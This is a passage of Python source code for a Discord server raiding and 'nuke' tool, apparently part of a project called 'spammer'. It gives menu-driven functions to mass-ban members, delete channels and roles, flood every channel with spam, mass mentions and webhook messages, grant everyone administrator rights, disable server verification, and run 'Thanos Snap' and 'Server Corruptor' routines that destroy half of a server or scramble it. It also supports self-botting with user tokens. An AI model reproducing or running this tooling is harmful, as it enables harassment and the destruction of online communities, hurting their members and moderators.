                        await changesettings(toggleopts,SERVER)
                    if toga.lower() == 'l':
                        clear()
                        presets = []
                        for file in os.listdir("spammer/presets/"):
                            if file.endswith(".smpreset"):
                                presets.append(file)
                        precount = -1
                        for pre in presets:
                            precount += 1
                            print(colored("{}. {}".format(precount,pre),menucolour))
                        prechoice = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'Preset To load: ')
                        with open("spammer/presets/{}".format(presets[int(prechoice)]), "r", errors="ignore") as handle:
                            content = handle.read().splitlines()
                            toggleopts = ast.literal_eval(content[0])
                            print("Loaded Config File")
                        await changesettings(toggleopts,SERVER)
                    if int(toga) == 0:
                        await main(SERVER)
                    elif int(toga) == 1:
                        if toggleopts['namechange'] == True:
                            toggleopts['namechange'] = False
                        else:
                            toggleopts['namechange'] = True
                        await changesettings(toggleopts,SERVER)
                    elif int(toga) == 2:
                        toggleopts['servname'] = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'New Server name: ')
                        await changesettings(toggleopts,SERVER)
                    elif int(toga) == 3:
                        if toggleopts['iconbegone'] == True:
                            toggleopts['iconbegone'] = False
                        else:
                            toggleopts['iconbegone'] = True
                        await changesettings(toggleopts,SERVER)
                    elif int(toga) == 4:
                        if toggleopts['changeicon'] == True:
                            toggleopts['changeicon'] = False
                        else:
                            toggleopts['changeicon'] = True
                        await changesettings(toggleopts,SERVER)
                    elif int(toga) == 5:
                        toggleopts['iconfile'] = askopenfilename(initialdir = os.getcwd(),title = "Select server icon")
                        await changesettings(toggleopts,SERVER)
                    elif int(toga) == 6:
                        if toggleopts['rembans'] == True:
                            toggleopts['rembans'] = False
                        else:
                            toggleopts['rembans'] = True
                        await changesettings(toggleopts,SERVER)
                    elif int(toga) == 7:
                        if toggleopts['chandel'] == True:
                            toggleopts['chandel'] = False
                        else:
                            toggleopts['chandel'] = True
                        await changesettings(toggleopts,SERVER)
                    elif int(toga) == 8:
                        if toggleopts['roledel'] == True:
                            toggleopts['roledel'] = False
                        else:
                            toggleopts['roledel'] = True
                        await changesettings(toggleopts,SERVER)
                    elif int(toga) == 9:
                        if toggleopts['userban'] == True:
                            toggleopts['userban'] = False
                        else:
                            toggleopts['userban'] = True
                        await changesettings(toggleopts,SERVER)
                    elif int(toga) == 10:
                        toggleopts['banreason'] = input ("Ban Reason: ")
                        await changesettings(toggleopts,SERVER)
                    elif int(toga) == 11:
                        appen = input ("Username and Descriminator: ")
                        if appen == '':
                            await changesettings(toggleopts,SERVER)
                        else:
                            toggleopts['userid'].append(appen)
                            await changesettings(toggleopts,SERVER)
                    elif int(toga) == 12:
                        if toggleopts['senddm'] == True:
                            toggleopts['senddm'] = False
                        else:
                            toggleopts['senddm'] = True
                        await changesettings(toggleopts,SERVER)
                    elif int(toga) == 13:
                        toggleopts['dmcontent']  = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'DM Content: ')
                        await changesettings(toggleopts,SERVER)
                    elif int(toga) == 14:
                        if toggleopts['createchan'] == True:
                            toggleopts['createchan'] = False
                        else:
                            toggleopts['createchan'] = True
                        await changesettings(toggleopts,SERVER)
                    elif int(toga) == 15:
                        if toggleopts['chanmethod'] == "set":
                            toggleopts['chanmethod'] = "ascii"
                        elif toggleopts['chanmethod'] == "ascii":
                            toggleopts['chanmethod'] = "voice"
                        elif toggleopts['chanmethod'] == "voice":
                            toggleopts['chanmethod'] = "set"
                        await changesettings(toggleopts,SERVER)
                    elif int(toga) == 16:
                        toggleopts['channame']  = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'Name of created channels: ')
                        await changesettings(toggleopts,SERVER)
                    elif int(toga) == 17:
                        toggleopts['channelno'] = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'Number of Channels to create: ')
                        await changesettings(toggleopts,SERVER)
                    elif int(toga) == 18:
                        if toggleopts['usespam'] == True:
                            toggleopts['usespam'] = False
                        else:
                            toggleopts['usespam'] = True
                        await changesettings(toggleopts,SERVER)
                    elif int(toga) == 19:
                        if toggleopts['spammethod'] == "text":
                            toggleopts['spammethod'] = "asc"
                        elif toggleopts['spammethod'] == "asc":
                            toggleopts['spammethod'] = "everyone"
                        elif toggleopts['spammethod'] == "everyone":
                            toggleopts['spammethod'] = "massment"
                        elif toggleopts['spammethod'] == "massment":
                            toggleopts['spammethod'] = "text"
                        await changesettings(toggleopts,SERVER)
                    elif int(toga) == 20:
                        toggleopts['customtxt'] = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'Text to spam: ')
                        await changesettings(toggleopts,SERVER)
                    elif int(toga) == 21:
                        if toggleopts['usetts'] == 'true':
                            toggleopts['usetts'] = 'false'
                        else:
                            toggleopts['usetts'] = 'true'
                        await changesettings(toggleopts,SERVER)
                    elif int(toga) == 22:
                        if toggleopts['gimmieadmin'] == True:
                            toggleopts['gimmieadmin'] = False
                        else:
                            toggleopts['gimmieadmin'] = True
                        await changesettings(toggleopts,SERVER)
                    elif int(toga) == 23:
                        toggleopts['me']  = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'Your ID for giving admin: ')
                        await changesettings(toggleopts,SERVER)
                    elif int(toga) == 24:
                        if toggleopts['giveeveryoneadmin'] == True:
                            toggleopts['giveeveryoneadmin'] = False
                        else:
                            toggleopts['giveeveryoneadmin'] = True
                        await changesettings(toggleopts,SERVER)
                    elif int(toga) == 25:
                        if toggleopts['createroles'] == True:
                            toggleopts['createroles'] = False
                        else:
                            toggleopts['createroles'] = True
                        await changesettings(toggleopts,SERVER)
                    elif int(toga) == 26:
                        toggleopts['crolecount'] = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'Number of Roles to create: ')
                        await changesettings(toggleopts,SERVER)
                    elif int(toga) == 27:
                        if toggleopts['rolesname'] == 'set':
                            toggleopts['rolesname'] = 'ascii'
                        else:
                            toggleopts['rolesname'] = 'set'
                        await changesettings(toggleopts,SERVER)
                    elif int(toga) == 28:
                        toggleopts['custrolename'] = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'Name of created roles: ')
                        await changesettings(toggleopts,SERVER)
                    elif int(toga) == 29:
                        if toggleopts['deleteemojis'] == True:
                            toggleopts['deleteemojis'] = False
                        else:
                            toggleopts['deleteemojis'] = True
                        await changesettings(toggleopts,SERVER)
                    elif int(toga) == 30:
                        if toggleopts['createemojis'] == True:
                            toggleopts['createemojis'] = False
                        else:
                            toggleopts['createemojis'] = True
                        await changesettings(toggleopts,SERVER)
                    elif int(toga) == 31:
                        toggleopts['emojipath'] = askopenfilename(initialdir = os.getcwd(),title = "Select emoji")
                        await changesettings(toggleopts,SERVER)
                    elif int(toga) == 32:
                        toggleopts['emojinum']  = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'Number of created emojis: ')
                        await changesettings(toggleopts,SERVER)
                    else:
                        print ("Invalid option")
                        await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'')
                        await changesettings(toggleopts,SERVER)
                except Exception as e:
                    print (e)
                    await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'')
                    await changesettings(toggleopts,SERVER)
            await changesettings(toggleopts,SERVER)

        elif int(opts) == 2:
            clear()
            print(colored("Other options",menucolour))
            print(colored("0.   Back",menucolour))
            print(colored("1.   Move People in VC",menucolour))
            print(colored("2.   Mass Nickname Change",menucolour))
            print(colored("3.   Make server Raidable and insecure",menucolour))
            print(colored("4.   Check Bot Permissions",menucolour))
            print(colored("5.   Channel Webhook Smasher",menucolour))
            print(colored("6.   Server Corruptor (Destructive)",menucolour))
            print(colored("7.   Music Player",menucolour))
            print(colored("8.   Make all channels NSFW",menucolour))
            print(colored("9.   Change All channels topic",menucolour))
            print(colored("10.  Thanos Snap (Destructive)",menucolour))
            sel = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'Selection: ')
            if int(sel) == 0:
                await main(SERVER)
            elif int(sel) == 1:
                clear()
                print("Moving members in voice channels.")
                while not client.is_closed():
                    channellist = []
                    memberlist = []
                    for channel in server.voice_channels:
                        channellist.append(channel)
                    for channel in channellist:
                        for member in channel.members:
                            memberlist.append(member)
                    for member in memberlist:
                        try:
                            channel = random.choice(channellist)
                            channel = channel
                            pool.add_task(mover,server.id,member.id,channel.id)
                            await asyncio.sleep(0.1)
                        except Exception:
                            pass
                    await loop.run_in_executor(ThreadPoolExecutor(), complete_pool)
            elif int(sel) == 2:
                clear()
                newnick = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'New Nickname: ')
                print(colored("Changing Nicknames, Please wait...",menucolour))
                for member in server.members:
                    pool.add_task(massnick,server.id,member.id,newnick)
                await loop.run_in_executor(ThreadPoolExecutor(), complete_pool)
                print(colored("Finished Changing nicknames.",menucolour))
                await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'Press Enter to return to menu.\n')
                await main(SERVER)
            elif int(sel) == 3:
                clear()
                print(colored("Modifying server rules, Please wait...",menucolour))
                if clienttype == 'bot':
                    headers={ 'Authorization': 'Bot '+token,'Content-Type': 'application/json'}
                else:
                    headers={ 'Authorization': token,'Content-Type': 'application/json'}
                payload = {'default_message_notifications': 0,'explicit_content_filter': 0,'verification_level': 0}
                requests.patch('https://discordapp.com/api/v6/guilds/'+str(server.id),headers=headers,json=payload)
                (colored("Rules modified.",menucolour))
                await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'Press Enter to return to menu.\n')
                await main(SERVER)
            elif int(sel) == 4:
                clear()
                for channel in server.channels:
                    myperms = channel.permissions_for(server.get_member(client.user.id))
                    print("Bot Has the following permissions:")
                    if myperms.administrator:
                        print("Administrator")
                        break
                    if myperms.ban_members:
                        print("Ban Members")
                    if myperms.manage_roles:
                        print("Manage Roles")
                    if myperms.manage_channels:
                        print("Manage Channels")
                    if myperms.manage_channels:
                        print("Manage Guild")
                    if myperms.mention_everyone:
                        print("Mention Everyone")
                    if myperms.manage_nicknames:
                        print("Manage Nicknames")
                    if myperms.move_members:
                        print("Move Members")
                    break
                await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'Press Enter to return to menu.\n')
                await main(SERVER)
            elif int(sel) == 5:
                clear()
                print("Webhook Smasher")
                print(colored("Please Enter the text to spam,\nFor random ascii type 'asc' or to go back type 'back' or 'b'\nThis will trigger the rate limit for webhooks instantly.",menucolour))
                txtspam = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'')
                if txtspam.lower() == "back":
                    await main(SERVER)
                if txtspam.lower() == "b":
                    await main(SERVER)
                channellist = []
                clear()
                print("Please Wait...")
                for channel in server.text_channels:
                    for webhook in await channel.webhooks():
                        await webhook.delete()
                    channellist.append(channel)
                if sys.platform.startswith('win32'):
                    if len(channellist) > 40:
                        screensize = 7
                        screensize += len(channellist)
                        os.system('mode con:cols=70 lines={}'.format(str(screensize)))
                elif sys.platform.startswith('linux'):
                    if len(channellist) > 40:
                        screensize = 7
                        screensize += len(channellist)
                        os.system("printf '\033[8;{};70t'".format(str(screensize)))
                chancounter = -1
                clear()
                print("Select Channel To spam.")
                for channel in channellist:
                    chancounter += 1
                    print("{}. {}".format(chancounter,channel))
                channelchoice = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'Channel of Choice: ')
                try:
                    chan = channellist[int(channelchoice)]
                except Exception:
                    await main(SERVER)
                webhooks = []
                for x in range(10):
                    wh = await chan.create_webhook(name=asciigen(random.randint(2,80)))
                    webhooks.append('https://discordapp.com/api/webhooks/{}/{}'.format(wh.id,wh.token))
                for webhook in webhooks:
                    pool.add_task(webhook_spam,webhook,txtspam)
                await main(SERVER)
            elif int(sel) == 6:
                clear()
                print ("Are you sure you want to corrupt this server?")
                y = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'Y/N: ')
                if y.lower() == 'y':
                    await corruptor(server)
                else:
                    await main(SERVER)
            elif int(sel) == 7:
                await music_player_channel_select(server)
            elif int(sel) == 8:
                y = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'Continue\nY/N: ')
                if y.lower() == 'y':
                    for channel in server.channels:
                        pool.add_task(nsfwchannel,channel.id)
                    await loop.run_in_executor(ThreadPoolExecutor(), complete_pool)
                    await main(SERVER)
                else:
                    await main(SERVER)
            elif int(sel) == 9:
                print(colored("0. Back\nEnter New Name"))
                y = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'')
                if y == "0":
                    await main(SERVER)
                for channel in server.channels:
                    pool.add_task(topicedit,channel.id,y)
                await loop.run_in_executor(ThreadPoolExecutor(), complete_pool)
                await main(SERVER)
            elif int(sel) == 10:
                clear()
                print(colored("The end is near.",'magenta'))
                s = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'Continue?(Y/N): ')
                if s.lower() == 'y':
                    pass
                else:
                    await main(SERVER)
                channels = []
                users = []
                roles = []
                for channel in server.channels:
                    try:
                        wh = await channel.create_webhook(name=asciigen(random.randint(2,80)))
                    except Exception as e:
                        print(e)
                        continue
                    else:
                        break
                beginquotes = ['When I’m done, half of humanity will still exist. Perfectly balanced, as all things should be. I hope they remember you.','You’re strong. But I could snap my fingers, and you’d all cease to exist.','You should have gone for the head.','Dread it. Run from it. Destiny still arrives. Or should I say, I have.','I ignored my destiny once, I can not do that again. Even for you. I’m sorry Little one.','With all six stones, I can simply snap my fingers, they would all cease to exist. I call that mercy.','The hardest choices require the strongest wills.']
                try:
                    hook = Webhook(wh.url)
                    hook.send("**{}**".format(random.choice(beginquotes)),avatar_url='https://i.imgur.com/hLU3tXY.jpg',username='Thanos')
                except Exception:
                    pass
                await asyncio.sleep(5)
                for channel in server.channels:
                    channels.append(channel)
                for role in server.roles:
                    roles.append(role)
                for user in server.members:
                    users.append(user)
                count = 0
                halfroles = int(round(len(server.roles) / 2))
                for role in roles:
                    count += 1
                    if halfroles == count:
                        break
                    pool.add_task(deleterole,str(role.id),SERVER)
                    roles.remove(role)
                count = 0
                halfchan = int(round(len(server.channels) / 2))
                for channel in channels:
                    count += 1
                    if halfchan == count:
                        break
                    pool.add_task(deletechannel,str(channel.id))
                    channels.remove(channel)
                count = 0
                halfuser = int(round(len(server.members) / 2))
                for user in users:
                    count += 1
                    if halfuser == count:
                        break
                    pool.add_task(banuser,str(user.id),SERVER)
                    users.remove(user)
                pool.wait_completion()
                await asyncio.sleep(10)
                for channel in channels:
                    try:
                        wh = await channel.create_webhook(name=asciigen(random.randint(2,80)))
                    except Exception as e:
                        print(e)
                        continue
                    else:
                        break
                endquotes = ['Perfectly balanced, as all things should be.','Fun isn’t something one considers when balancing the universe. But this… does put a smile on my face.']
                try:
                    hook = Webhook(wh.url)
                    hook.send("**{}**".format(random.choice(endquotes)),avatar_url='https://i.imgur.com/hLU3tXY.jpg',username='Thanos')
                except Exception:
                    pass
                await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'Perfectly balanced, as all things should be.')
                await main(SERVER)
            else:
                await main(SERVER)

        elif int(opts) == 3:
            for channel in server.text_channels:
                invitelink = await channel.create_invite()
                invite = invitelink.url
                pyperclip.copy(invite)
                print (invite + " copied to clipboard.")
                await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'')
                await main(SERVER)
            for channel in server.voice_channels:
                invitelink = await channel.create_invite()
                invite = invitelink.url
                pyperclip.copy(invite)
                print (invite + " copied to clipboard.")
                await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'')
                await main(SERVER)
            print ("Unable to create invite.")
            await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'')
            await main(SERVER)

        elif int(opts) == 4:
            play = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'Playing ')
            await client.change_presence(activity=discord.Game(name=play))
            await main(SERVER)

        elif int(opts) == 5:
            print ("Are you sure you want to leave this server? (Y/N): ")
            yn = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'')
            if yn.lower() == 'y':
                await server.leave()
                await asyncio.sleep(3)
                await serverselect()
            else:
                await main(SERVER)

        elif int(opts) == 6:
            await serverselect()
    except Exception as e:
        print (colored("Error:","red"))
        print (colored(e,"red"))
        await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'')
        await main(SERVER)

async def mass_tag(SERVER,usetts):
    await asyncio.sleep(5)
    server = client.get_guild(int(SERVER))
    msg = ''
    for member in server.members:
        msg += member.mention + ' '
    while not client.is_closed():
        for channel in server.text_channels:
            myperms = channel.permissions_for(server.get_member(client.user.id))
            if not myperms.send_messages:
                continue
            print('Mass Mentioning in: '+channel.name)
            for m in [msg[i:i+1999] for i in range(0, len(msg), 1999)]:
                pool.add_task(sendspam,str(channel.id),m,usetts)

async def ascii_spam(SERVER,usetts): # "oh god you scrambled that server"
    await asyncio.sleep(5)
    server = client.get_guild(int(SERVER))
    await client.wait_until_ready()
    while not client.is_closed():
        for channel in server.text_channels:
            myperms = channel.permissions_for(server.get_member(client.user.id))
            if not myperms.send_messages:
                continue
            print('Ascii Spamming in: '+channel.name)
            pool.add_task(sendspam,str(channel.id),asciigen(1999),usetts)

async def text_spam(SERVER,customtxt,usetts):
    await asyncio.sleep(5)
    server = client.get_guild(int(SERVER))
    await client.wait_until_ready()
    while not client.is_closed():
        for channel in server.text_channels:
            myperms = channel.permissions_for(server.get_member(client.user.id))
            if not myperms.send_messages:
                continue
            print('Text Spamming in: '+channel.name)
            pool.add_task(sendspam,str(channel.id),customtxt,usetts)

async def everyonespam(SERVER,usetts):
    await asyncio.sleep(5)
    server = client.get_guild(int(SERVER))
    await client.wait_until_ready()
    while not client.is_closed():
        for channel in server.text_channels:
            myperms = channel.permissions_for(server.get_member(client.user.id))
            if not myperms.send_messages:
                continue
            message = "@everyone"
            print('@everyone Spamming in: '+channel.name)
            pool.add_task(sendspam,str(channel.id),message,usetts)

async def corruptor(server):
    clear()
    SERVER = server.id
    print("Corrupting...")
    for channel in server.channels:
        pool.add_task(corrupt_channel,channel.id,channel.name)
    for role in server.roles:
        pool.add_task(corrupt_role,server.id,role.id,role.name)
    servername = ''
    for x in server.name:
        if random.randint(1,2) == 1:
            servername += asciigen(1)
        else:
            servername += x
    await server.edit(name=servername)
    pool.wait_completion()
    print("Corrupted the server.")
    await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'Press enter to return to menu.')
    await main(SERVER)

async def music_player_channel_select(server):
    channellist = []
    SERVER = server.id
    for channel in server.voice_channels:
        channellist.append(channel)
    if sys.platform.startswith('win32'):
        if len(channellist) > 40:
            screensize = 7
            screensize += len(channellist)
            os.system('mode con:cols=70 lines={}'.format(str(screensize)))
    elif sys.platform.startswith('linux'):
        if len(channellist) > 40:
            screensize = 7
            screensize += len(channellist)
            os.system("printf '\033[8;{};70t'".format(str(screensize)))
    while True:
        chancounter = -1
        clear()
        print("b. Return to menu")
        for channel in channellist:
            chancounter += 1
            print("{}. {}".format(chancounter,channel))
        channelchoice = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'Channel of Choice: ')
        if channelchoice.lower() == "b":
            await main(SERVER)
        try:
            voice_chan = channellist[int(channelchoice)]
        except Exception:
            await music_player_channel_select(server)
        await music_player_main(voice_chan,server)

async def music_player_main(voice_channel,server):
    vc = await voice_channel.connect()
    while True:
        clear()
        print(colored("Channel: {}".format(voice_channel.name),menucolour))
        print()
        print(colored("1. Play YouTube Link.",menucolour))
        print(colored("2. Pause Player",menucolour))
        print(colored("3. Resume Player",menucolour))
        print(colored("4. Stop Player",menucolour))
        print(colored("5. Volume Adjustment",menucolour))
        print(colored("6. Disconnect",menucolour))
        try:
            player_choice = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'Option: ')
            if int(player_choice) == 1:
                clear()
                url = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'YouTube Link to play: ')
                try:
                    if os.path.isfile('spammer/file.mp3'):
                        os.remove('spammer/file.mp3')
                        print ("Removed old .mp3.")
                    with youtube_dl.YoutubeDL(ydl_opts) as ydl:
                        ydl.download([url])
                    vc.play(discord.FFmpegPCMAudio('spammer/file.mp3'))
                    vc.source = discord.PCMVolumeTransformer(vc.source)
                    vc.source.volume = 1.0
                except Exception as e:
                    await loop.run_in_executor(ThreadPoolExecutor(), inputselection, str(e))
            elif int(player_choice) == 2:
                vc.pause()
            elif int(player_choice) == 3:
                vc.resume()
            elif int(player_choice) == 4:
                vc.stop()
            elif int(player_choice) == 5:
                clear()
                newvol = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'New Volume: ')
                try:
                    vc.source.volume = float(int(newvol))
                except Exception as e:
                    await loop.run_in_executor(ThreadPoolExecutor(), inputselection,e)
            elif int(player_choice) == 6:
                await vc.disconnect(force=True)
                await music_player_channel_select(server)
        except Exception as e:
            continue

if clienttype.lower() == "user":
    try:
        client.run(token, bot=False)
    except Exception as c:
        print (str(c))
if clienttype.lower() == "bot":
    try:
        client.run(token)
    except Exception as c:
        print (str(c))
        input()
